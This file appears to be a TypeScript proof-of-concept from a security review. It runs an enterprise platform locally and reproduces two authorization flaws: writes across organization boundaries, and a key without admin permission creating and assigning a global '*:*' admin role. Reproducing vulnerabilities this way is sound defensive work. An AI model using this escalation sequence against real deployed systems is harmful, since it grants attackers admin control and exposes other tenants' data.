// Realistic HTTP reproduction against the actual application.
// Validates:
//  C2 authz-tenant-scoping: an org-scope-style key (device:write, user:write) can
//     read/write entities in any organization.
//  C1 authz-role-assignment: a user:write/role:write key (no admin permission) can
//     create an admin role and assign it, and governance decisions then treat the
//     target user as fully privileged.
import { createApp } from "/home/kensan/Projects/Mirai-DX-Project/Construction-Enterprise-Operating-Platform/src/app.ts";
import { createServer } from "/home/kensan/Projects/Mirai-DX-Project/Construction-Enterprise-Operating-Platform/src/api/server.ts";
import { createApiKey } from "/home/kensan/Projects/Mirai-DX-Project/Construction-Enterprise-Operating-Platform/src/api/middleware/auth.ts";

const PORT = 4871;
const container = await createApp();
// Key that resembles an org/site-scoped manager: no wildcard, no admin permission.
const siteKey = createApiKey(
  "user-site-manager",
  ["device:read", "device:write", "application:read", "workflow:read", "workflow:write", "audit:read"],
  container.apiKeyStore,
);
// Key that resembles a user/role manager: no admin permission, but user:write + role:write.
const mgrKey = createApiKey(
  "user-org-manager",
  ["user:read", "user:write", "role:read", "role:write", "governance:evaluate"],
  container.apiKeyStore,
);

const server = createServer({ port: PORT }, container);
await new Promise((resolve) => server.listen(PORT, resolve));
const base = `http://127.0.0.1:${PORT}`;

async function req(method: string, path: string, cred: string, body?: unknown): Promise<{ status: number; data: any }> {
  const res = await fetch(`${base}${path}`, {
    method,
    headers: {
      Authorization: `Bearer ${cred}`,
      ...(body !== undefined ? { "Content-Type": "application/json" } : {}),
    },
    ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
  });
  let data: any = null;
  try { data = await res.json(); } catch { /* 204 etc. */ }
  return { status: res.status, data };
}

const siteCred = `${siteKey.key}:${siteKey.secret}`;
const mgrCred = `${mgrKey.key}:${mgrKey.secret}`;
const results: Record<string, unknown> = {};

// ---- C2: cross-organization read ----
const devList = await req("GET", "/api/v1/devices?limit=200", siteCred);
results["c2_devices_before_orgs"] = (devList.data?.devices ?? []).map((d: any) => ({ id: d.id, organizationId: d.organizationId }));

// ---- C2: cross-organization write (create device in org-hq, not the key's nominal org) ----
const devCreate = await req("POST", "/api/v1/devices", siteCred, {
  id: "device-cross-org",
  organizationId: "org-hq",
  kind: "sensor",
  status: "provisioned",
});
results["c2_create_device_in_org_hq_status"] = devCreate.status;
results["c2_create_device_in_org_hq_body"] = devCreate.data;

const devUpdate = await req("PUT", "/api/v1/devices/device-cross-org", siteCred, { status: "active" });
results["c2_update_device_in_org_hq_status"] = devUpdate.status;

// ---- C2: cross-organization user create/read ----
const userCreate = await req("POST", "/api/v1/users", mgrCred, {
  id: "user-site-x",
  organizationId: "org-site-01",
  displayName: "Site X",
  email: "site-x@example.com",
  status: "active",
  roleIds: [],
});
results["c2_create_user_in_org_site_status"] = userCreate.status;
const userList = await req("GET", "/api/v1/users?limit=200", mgrCred);
results["c2_users_visible"] = (userList.data?.users ?? []).map((u: any) => ({ id: u.id, organizationId: u.organizationId }));

// ---- C1: create admin-capable role without holding admin permission ----
const roleCreate = await req("POST", "/api/v1/roles", mgrCred, {
  id: "role-hax",
  name: "Hax",
  description: "created by user manager",
  scope: "global",
  permissions: ["*:*"],
});
results["c1_create_role_star_star_status"] = roleCreate.status;
results["c1_create_role_star_star_body"] = roleCreate.data;

// ---- C1: assign that role to a user ----
const roleAssign = await req("PUT", "/api/v1/users/user-site-x", mgrCred, { roleIds: ["role-hax"] });
results["c1_assign_admin_role_status"] = roleAssign.status;

// ---- C1: governance now treats the user as fully privileged ----
const evalBefore = await req("POST", "/api/v1/governance/evaluate", mgrCred, {
  subject: "user-site-x",
  resource: "user",
  action: "write",
  roleIds: ["role-hax"],
  attributes: {},
});
results["c1_governance_evaluate_after_assign"] = evalBefore.data;

console.log(JSON.stringify(results, null, 2));
server.close();
